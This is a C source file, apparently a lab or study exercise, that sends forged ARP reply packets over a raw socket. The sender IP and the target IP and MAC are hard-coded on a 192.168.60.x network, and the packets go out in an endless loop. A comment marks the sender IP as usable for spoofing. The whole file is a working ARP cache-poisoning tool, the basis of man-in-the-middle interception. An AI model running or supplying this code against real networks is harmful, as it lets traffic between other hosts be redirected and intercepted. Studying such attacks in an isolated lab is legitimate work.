#define _DEFAULT_SOURCE
#include "../basic/header.h"

#define DESTMAC0 0xbe
#define DESTMAC1 0x5c
#define DESTMAC2 0x21
#define DESTMAC3 0xd4
#define DESTMAC4 0x5a
#define DESTMAC5 0xe3
#define INTERFACE "ens160"

struct re_arphdr
{
  unsigned short int ar_hrd;                /* Format of hardware address.  */
  unsigned short int ar_pro;                /* Format of protocol address.  */
  unsigned char ar_hln;                    /* Length of hardware address.  */
  unsigned char ar_pln;                    /* Length of protocol address.  */
  unsigned short int ar_op;                /* ARP opcode (command).  */
  /* Ethernet looks like this: This bit is variable sized however...  */
  unsigned char __ar_sha[ETH_ALEN];        /* Sender hardware address.  */
  unsigned char __ar_sip[4];               /* Sender IP address.  */
  unsigned char __ar_tha[ETH_ALEN];        /* Target hardware address.  */
  unsigned char __ar_tip[4];               /* Target IP address.  */
};


void*
ifreq_ioctl(int sock_r, int option) {

	struct ifreq *ifreq_t = malloc(sizeof(struct ifreq));
	bzero(ifreq_t,sizeof(struct ifreq));

	strncpy(ifreq_t->ifr_name, INTERFACE , IF_NAMESIZE-1);
	if((ioctl(sock_r,option,ifreq_t)) < 0){
		perror("ioctl error ");
		exit(EXIT_FAILURE);
	}

	return (void*)(ifreq_t);
}

void*
create_ethhdr(unsigned char* sendbuff, struct ifreq *ifreq_c) {

	struct ethhdr *eth = (struct ethhdr *) sendbuff ;
	eth->h_source[0] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[0]);
	eth->h_source[1] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[1]);
	eth->h_source[2] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[2]);
	eth->h_source[3] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[3]);
	eth->h_source[4] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[4]);
	eth->h_source[5] = (unsigned char) (ifreq_c->ifr_hwaddr.sa_data[5]);

	eth->h_dest[0] = DESTMAC0;
	eth->h_dest[1] = DESTMAC1;
	eth->h_dest[2] = DESTMAC2;
	eth->h_dest[3] = DESTMAC3;
	eth->h_dest[4] = DESTMAC4;
	eth->h_dest[5] = DESTMAC5;

	eth->h_proto = htons(ETH_P_ARP);

	return (void*)(eth);
}

int
main() {

	int sock_r = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	
	if(sock_r < 0) {
		perror("socket error ");
		exit(EXIT_FAILURE);
	}

	unsigned char* sendbuff = (unsigned char*)malloc(42);

	struct ifreq *ifreq_i = ifreq_ioctl(sock_r, SIOCGIFINDEX);
	struct ifreq *ifreq_c = ifreq_ioctl(sock_r, SIOCGIFHWADDR); /* MAC ADDRESS */
	struct ethhdr *eth = create_ethhdr(sendbuff,ifreq_c); /* ETHERNET HEADER */

	struct re_arphdr *arp = (struct re_arphdr*) (sendbuff + sizeof(struct ethhdr));

	arp->ar_hrd = htons(ARPHRD_ETHER);
	arp->ar_pro = htons(ETH_P_IP);
	arp->ar_op = htons(ARPOP_REPLY);
	arp->ar_hln = 6;
	arp->ar_pln = 4;

	/* OUR MAC ADDRESS */
	arp->__ar_sha[0] = eth->h_source[0];
	arp->__ar_sha[1] = eth->h_source[1];
	arp->__ar_sha[2] = eth->h_source[2];
	arp->__ar_sha[3] = eth->h_source[3];
	arp->__ar_sha[4] = eth->h_source[4];
	arp->__ar_sha[5] = eth->h_source[5];

	/* DESTINATION ADDRESS */
	arp->__ar_tha[0] = DESTMAC0;
	arp->__ar_tha[1] = DESTMAC1;
	arp->__ar_tha[2] = DESTMAC2;
	arp->__ar_tha[3] = DESTMAC3;
	arp->__ar_tha[4] = DESTMAC4;
	arp->__ar_tha[5] = DESTMAC5;

	/* OUR IP (CAN BE USED TO SPOOF) */
	arp->__ar_sip[0] = 192; 
	arp->__ar_sip[1] = 168; 
	arp->__ar_sip[2] = 60; 
	arp->__ar_sip[3] = 9;

	/* DESTINATION IP */
	arp->__ar_tip[0] = 192;	
	arp->__ar_tip[1] = 168;	
	arp->__ar_tip[2] = 60;	
	arp->__ar_tip[3] = 76;	

	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	device.sll_ifindex = (ifreq_i->ifr_ifindex);
	device.sll_halen = htons(ETH_ALEN);
	device.sll_addr[0] = DESTMAC0;
	device.sll_addr[1] = DESTMAC1;
	device.sll_addr[2] = DESTMAC2;
	device.sll_addr[3] = DESTMAC3;
	device.sll_addr[4] = DESTMAC4;
	device.sll_addr[5] = DESTMAC5;
	device.sll_family = AF_PACKET;
	device.sll_protocol = htons(ETH_P_ARP);

	while (1) {
		int status = sendto(sock_r, sendbuff, 42, 0, (struct sockaddr*) &device, sizeof(device));
		if (status <= 0) {
			perror("sendto() failed ");
			exit(EXIT_FAILURE);
		}
	}

	return 0;
}
